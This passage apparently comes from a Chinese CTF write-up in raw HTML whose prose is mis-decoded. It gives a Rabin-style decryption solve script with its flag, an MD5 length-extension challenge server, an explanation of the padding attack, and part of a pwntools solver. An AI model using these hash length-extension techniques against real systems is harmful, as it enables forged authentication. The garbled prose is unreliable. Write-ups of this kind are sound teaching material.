style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.3088899999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0588899999999999em;"><span style="top:-3.4130000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9227em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.4623857142857144em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">ä¹‹</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">å¯¹</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">éƒ½</span><span class="mord cjk_fallback">å†</span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">ä¸€</span><span class="mord cjk_fallback">æ¬¡</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">a</span><span class="mord mathnormal">b</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">å°±</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">ä»¥</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">åˆ°</span><span class="mord">1</span><span class="mord">6</span><span class="mord cjk_fallback">ä¸ª</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">ç­›</span><span class="mord cjk_fallback">é€‰</span><span class="mord cjk_fallback">å¯</span><span class="mord cjk_fallback">å¾—</span><span class="mord cjk_fallback">æœ€</span><span class="mord cjk_fallback">ç»ˆ</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> math<br><br>p= <span class="hljs-number">7069399887135404147313451925856463790122288322955120353958439275669624760478622857767374372872346990136954266792268812402268519788981659317134531701377703</span><br>q= <span class="hljs-number">7140401794925570651681210965995716787861669619864423417950517149172165700476247742598189428763096590450485848849559705021102255619953633260576326755189491</span><br>n= <span class="hljs-number">50478355643148266354923007679620780526141911052216183219350733856301203909504117920782157926474133059342037694939720794471142298089233400685616528009799838411628460021560455031638939642439782783664643276781622313533393143794433785002028042268329216889290321025657400866309989050114906562764560145969527319173</span><br>c= <span class="hljs-number">4087656016708624348430154736700209864616058176527780296412388210036556189223356217878476122554309456912053098904757651242467846016533157893713565869179648449607552843430116377433424175512165110689917185788645907642250661954679293286430479127383793220643392349769864898681882146542120386576626400193522553192</span><br>e= <span class="hljs-number">16</span><br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rabin</span>(<span class="hljs-params">c</span>):<br>    m1 = <span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>    m2 = p-<span class="hljs-built_in">pow</span>(c, (p + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, p)<br>    m3 = <span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br>    m4 = q-<span class="hljs-built_in">pow</span>(c, (q + <span class="hljs-number">1</span>) // <span class="hljs-number">4</span>, q)<br><br>    <span class="hljs-keyword">return</span> m1,m2,m3,m4<br><br>cs = [c]<br>lge=math.log(e,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(lge)):<span class="hljs-comment">#rangeé‡Œæ”¾log2e</span><br>    t = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> c2 <span class="hljs-keyword">in</span> cs:<br>        x = rabin(c2)<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> x:<br>            t.add(j)<br>    cs = <span class="hljs-built_in">list</span>(t)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs:<br>    flag=long_to_bytes(i)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>        <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#BaseCTF&#123;01c28b9c-7924-4c04-b71d-1cca15342618&#125;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="extendmd5"><a class="markdownIt-Anchor" href="#extendmd5"></a> extendmd5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> signal<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random <br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_md5</span>(<span class="hljs-params">self,text</span>):<br>        mymd5=hashlib.md5()<br>        mymd5.update(text)<br>        <span class="hljs-keyword">return</span> mymd5.hexdigest()<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        signal.alarm(<span class="hljs-number">30</span>)<br><br>        c=random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">64</span>)<br>        want=random.randbytes(c)<br>        want_md5=<span class="hljs-variable language_">self</span>.my_md5(want)<br>        <span class="hljs-variable language_">self</span>.send(want_md5.encode())<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nPlease input the secret:&quot;</span>)<br>            secret = <span class="hljs-variable language_">self</span>.recv()<br><br>            final=want+secret<br>            final_md5=<span class="hljs-variable language_">self</span>.my_md5(final)<br><br>            <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nPlease input your md5:&quot;</span>)<br>            your_md5=<span class="hljs-variable language_">self</span>.recv().decode()<br>            <span class="hljs-keyword">if</span>  final_md5 == your_md5:<br>                <span class="hljs-variable language_">self</span>.send(flag.encode())<br>                <span class="hljs-keyword">break</span><br>        <br>            <br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br><br></code></pre></td></tr></table></figure><p>ï¼ˆå‰è¨€ï¼šå¾ªç¯100æ¬¡å•çº¯æƒ³æ£€éªŒä¸€ä¸‹å†™ä»£ç è§£å†³ï¼Œè€Œä¸æ˜¯ç›´æ¥ç”¨åˆ«äººçš„è„šæœ¬ç”Ÿæˆä¸€ä¸ªç»“æœå°±å¥½äº†ï¼Œæ‰€ä»¥å¯èƒ½ä¼šæœ‰ç‚¹æ¶å¿ƒï¼Œè¯·è§è°…ï¼‰</p><p>å°±æ˜¯æ”¾åœ¨å¯†ç é‡Œå¾—md5æ‰©å±•æ”»å‡»</p><p>åŸå§‹å†…å®¹é•¿åº¦æ˜¯éšæœºï¼Œçˆ†ç ´ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p><p>ï¼ˆä»¥ä¸‹åŸç†è®²çš„å¯èƒ½ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥çœ‹ç»“åˆç¬¬äºŒå‘¨webä¸­çš„è§†é¢‘è®²è§£è§‚çœ‹ï¼‰</p><p>åŸç†ï¼š</p><p>é¦–å…ˆéœ€è¦ä»md5åŠ å¯†è¿‡ç¨‹å¼€å§‹è¯´èµ·ï¼Œmd5åŠ å¯†æ˜¯åˆ†ç»„è¿›è¡ŒåŠ å¯†çš„ï¼Œæ¯ç»„512bitsã€‚åœ¨ä¸€å¼€å§‹ï¼Œéœ€è¦å¯¹æ˜æ–‡è¿›è¡Œå¡«å……ï¼Œå¦‚æœæœ€ååˆ†ç»„ä¸æ»¡512bitsçš„éœ€è¦å¡«å……åˆ°512bitsï¼›å¦‚æœåŸå§‹å†…å®¹åˆšåˆšå¥½å¯ä»¥åˆ†ç»„ï¼Œé‚£ä¹Ÿéœ€è¦å¡«å……ä¸€ä¸ª512bitsçš„åˆ†ç»„ã€‚md5æ‰©å±•æ”»å‡»æœ€é‡è¦çš„å°±æ˜¯ç†è§£å¡«å……è§„åˆ™ã€‚</p><p>å¡«å……è§„åˆ™ï¼š</p><p>é¦–å…ˆæ·»åŠ ä¸€ä¸ªå›ºå®šå­—èŠ‚bâ€™\x80â€™ï¼Œä¹‹åéœ€è¦å¡«å……ç”±åŸå§‹æ˜æ–‡é•¿åº¦è®¡ç®—å¾—æ¥çš„8ä¸ªå­—èŠ‚ï¼Œè¿™8ä¸ªå­—èŠ‚æ˜¯ä¸€å®šéœ€è¦å¡«å……çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™ä¸ªæ—¶å€™æ˜æ–‡å·²ç»åˆ°è¾¾äº†57bytesï¼Œå†å¡«å……8å­—èŠ‚å°±ä¼šä¸å†æ˜¯åˆšå¥½çš„64bytes(512bits)ï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬è¦æ–°æ·»ä¸€ä¸ªåˆ†ç»„ã€‚æœ€åå…«å­—èŠ‚ä¸ºåŸå§‹æ˜æ–‡é•¿åº¦ï¼Œå¡«å……æ–¹å¼ä¸ºå°ç«¯åºã€‚</p><p>æ¯”å¦‚len=10ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\x80â€™ï¼Œè¿™æ—¶å€™é•¿åº¦ä¸º11ï¼Œå¯ä»¥å¡«å……8å­—èŠ‚ï¼Œé‚£ä¹ˆå†å¡«å……bâ€™\x00â€™*(64-8-1-10)ï¼Œ64ä¸ºä¸€ä¸ªåˆ†ç»„çš„å­—èŠ‚æ•°ï¼Œ8ä¸ºæœ€åéœ€è¦å¡«å……çš„æ•°æ®ï¼Œ1æ˜¯æœ€å¼€å§‹å¡«å……çš„bâ€™\x80â€™ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\x50\x00\x00\x00\x00\x00\x00\x00â€™ã€‚</p><p>æ¯”å¦‚len=33ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\x80â€™ï¼Œé‚£ä¹ˆå†å¡«å……bâ€™\x00â€™*(64-8-1-33)ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\x08\x01\x00\x00\x00\x00\x00\x00â€™ã€‚åŸå§‹æ•°æ®ä¸º264bitsï¼ŒéªŒè¯ï¼š0x108=264</p><p>æ¯”å¦‚len=56ï¼Œå…ˆå¡«ä¸Šä¸ªbâ€™\x80â€™ï¼Œè¿™æ—¶å€™æœ‰57å­—èŠ‚ï¼Œå†å¡«å……8å­—èŠ‚çš„è¯ä¸º65å­—èŠ‚ï¼Œé‚£ä¹ˆä¸æ»¡è¶³åˆ†ç»„æ¡ä»¶ï¼Œæ‰€ä»¥è¿™æ—¶å€™æˆ‘ä»¬éœ€è¦å†å¡«å……bâ€™\x00â€™*(64*2-8-1-56)ï¼Œä¹Ÿå°±æ˜¯63ä¸ª0å­—èŠ‚ï¼Œæœ€åå¡«å……å…«ä¸ªå­—èŠ‚ä¸ºbâ€™\xc0\x01\x00\x00\x00\x00\x00\x00ã€‚åŸå§‹æ•°æ®ä¸º448bitsï¼ŒéªŒè¯ï¼š0x01c0=448</p><p>å½“æˆ‘ä»¬å¡«å……å®Œæ•°æ®åï¼Œä»ç¬¬ä¸€ä¸ªåˆ†ç»„å¼€å§‹è¿›è¡Œmd5åŠ å¯†ï¼ŒåŠ å¯†è¿‡ç¨‹å¯ä»¥ä¸ç”¨åœ¨æ„ï¼Œåªéœ€çŸ¥é“æ¯æ¬¡åŠ å¯†åå¾—åˆ°32ä¸ª16å…­è¿›åˆ¶ï¼ŒåŠ å¯†åçš„ç»“æœåˆ†æˆå››ç»„ï¼Œå½“æˆä¸‹ä¸€ä¸ªåˆ†ç»„åŠ å¯†çš„IVï¼Œè¿™æ˜¯æ”»å‡»çš„å…³é”®ã€‚</p><p>ä¸€å¼€å§‹ï¼Œæˆ‘ä»¬çŸ¥é“åŸå§‹å†…å®¹çš„md5å€¼ï¼Œå¹¶ä¸”åŸå§‹å†…å®¹é•¿åº¦å°äº64å­—èŠ‚ã€‚è¿™æ—¶å€™ï¼ŒæœåŠ¡å™¨æˆ‘ä»¬å¯ä»¥åœ¨åŸå§‹å†…å®¹åé¢æ·»åŠ è‡ªå®šä¹‰æ•°æ®ï¼Œé‚£ä¹ˆæœ€é‡è¦çš„å°±æ˜¯ï¼Œæ ¹æ®å¡«å……è§„åˆ™ï¼Œæˆ‘ä»¬åªè¦çŸ¥é“åŸå§‹å†…å®¹é•¿åº¦ï¼Œæˆ‘ä»¬å°±å¯ä»¥è‡ªå·±è¿›è¡Œå¡«å……ï¼Œåªè¦æˆ‘ä»¬è‡ªå·±å¡«å……çš„æ•°æ®ä¸md5åŠ å¯†æ—¶ä¸€æ ·ï¼Œæœ€åè®¡ç®—å‡ºçš„md5å€¼ä¹Ÿä¼šä¸€æ ·ï¼Œé‚£ä¹ˆè¿™ä¸ªç»“æœæ˜¯ä½œä¸ºä¸‹ä¸€ç»„å†…å®¹åŠ å¯†æ—¶çš„IVã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åƒæœåŠ¡å™¨å‘é€æ•°æ®ä¸ºï¼šå¡«å……å†…å®¹+ä»»æ„å†…å®¹</p><p>æœ€åå‘é€ ä»»æ„å†…å®¹çš„md5ç»“æœï¼Œå½“ç„¶è¿™é‡Œéœ€è¦æ ¹æ®æœåŠ¡å™¨ä¸€å¼€å§‹ä¼ æ¥çš„md5å€¼ä½œä¸ºIVæ¥è¿›è¡ŒåŠ å¯†</p><p>è¿™é‡Œæˆ‘ç”¨GPTç”Ÿæˆäº†ä¸€ä»½md5åŠ å¯†ä»£ç ï¼Œåœ¨åŠ å¯†æ—¶ä¼ é€è¿›å»IVå€¼ï¼Œ<strong>æœ€é‡è¦çš„æ˜¯ï¼Œæˆ‘è¿™ä»½æºç æ˜¯åŸå§‹çš„md5åŠ å¯†ä»£ç ï¼Œæˆ‘ä»¬éœ€è¦åœ¨â€ä»»æ„å†…å®¹â€œå‰å¡«ä¸Š64bytes*åˆ†ç»„æ•°ï¼Œè€Œä¸”åœ¨åŠ å¯†å‡½æ•°(my_md5)ä¸­ï¼Œæˆ‘ä»¬åªè¦æœ€åä¸€ä¸ªåˆ†ç»„çš„ç»“æœï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è·³è¿‡å‰é¢å‡ ä¸ªåˆ†ç»„ï¼ˆåœ¨ä»£ç ä¸­skipå˜é‡å¤„ä½“ç°ï¼‰</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-comment"># å®šä¹‰MD5æ‰€éœ€çš„å¸¸é‡</span><br>T = [<span class="hljs-built_in">int</span>(<span class="hljs-number">4294967296</span> * <span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]<br><br><br><span class="hljs-comment"># å®šä¹‰å·¦æ—‹è½¬å‡½æ•°</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">left_rotate</span>(<span class="hljs-params">x, c</span>):<br>    <span class="hljs-keyword">return</span> (x &lt;&lt; c) | (x &gt;&gt; (<span class="hljs-number">32</span> - c))<br><br><br><span class="hljs-comment"># å®šä¹‰MD5ä¸»å¾ªç¯æ‰€éœ€çš„å››ä¸ªåŸºæœ¬å‡½æ•°</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">F</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> (x &amp; y) | (~x &amp; z)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">G</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> (x &amp; z) | (y &amp; ~z)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">H</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> x ^ y ^ z<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">I</span>(<span class="hljs-params">x, y, z</span>):<br>    <span class="hljs-keyword">return</span> y ^ (x | ~z)<br><br><br><span class="hljs-comment"># å®šä¹‰MD5ç®—æ³•</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_md5</span>(<span class="hljs-params">message, A, B, C, D, skip</span>):<br>    <span class="hljs-comment"># åˆå§‹åŒ–å˜é‡</span><br>    a, b, c, d = A, B, C, D<br><br>    <span class="hljs-comment"># å¡«å……æ¶ˆæ¯</span><br>    original_length = <span class="hljs-built_in">len</span>(message) * <span class="hljs-number">8</span><br>    message += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(message) * <span class="hljs-number">8</span>) % <span class="hljs-number">512</span> != <span class="hljs-number">448</span>:<br>        message += <span class="hljs-string">b&#x27;\x00&#x27;</span><br>    message += struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, original_length)<br><br>    <span class="hljs-comment"># å¤„ç†æ¯ä¸ª512ä½ï¼ˆ64å­—èŠ‚ï¼‰å—</span><br>    <span class="hljs-comment"># è·³è¿‡å‰å‡ ä¸ªåˆ†ç»„</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span> * skip, <span class="hljs-built_in">len</span>(message), <span class="hljs-number">64</span>):<br>        block = message[i:i + <span class="hljs-number">64</span>]<br>        X = struct.unpack(<span 